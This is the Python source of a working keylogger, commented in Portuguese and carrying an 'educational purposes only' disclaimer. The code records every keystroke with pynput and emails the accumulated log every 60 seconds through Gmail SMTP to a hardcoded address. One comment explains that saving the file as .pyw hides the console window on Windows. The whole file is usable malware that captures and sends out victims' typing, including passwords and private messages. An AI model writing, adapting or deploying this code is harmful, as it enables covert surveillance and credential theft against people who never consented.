import pynput.keyboard
import threading
import smtplib
from email.mime.text import MIMEText

# -------------------------------------------------------------------------
# AVISO LEGAL / DISCLAIMER
# Este código foi desenvolvido APENAS para fins educacionais e de aprendizado.
# O uso de keyloggers em computadores de terceiros sem consentimento é ILEGAL.
# -------------------------------------------------------------------------

class Keylogger:
    def __init__(self, time_interval=60, email="upperprovedor@gmail.com", password="YOUR_APP_PASSWORD_HERE"):
        self.log = "Keylogger Iniciado..."
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        """Envia o log por e-mail e reinicia o buffer."""
        if self.log:
            self.send_mail(self.email, self.password, self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self, email, password, message):
        try:
            msg = MIMEText(message)
            msg['Subject'] = f"Keylogger Report - {email}"
            msg['From'] = email
            msg['To'] = email

            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(email, password)
            server.send_message(msg)
            server.quit()
            print("[+] E-mail enviado com sucesso.")
        except Exception as e:
            print(f"[-] Falha ao enviar e-mail: {e}")

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

if __name__ == "__main__":
    # Intervalo de 60 segundos para envio de e-mail
    # IMPORTANTE: Substitua 'YOUR_APP_PASSWORD_HERE' pela senha de aplicativo do Gmail.
    my_keylogger = Keylogger(time_interval=60, email="upperprovedor@gmail.com", password="YOUR_APP_PASSWORD_HERE")
    # No Windows, salvar como .pyw remove o console.
    my_keylogger.start()
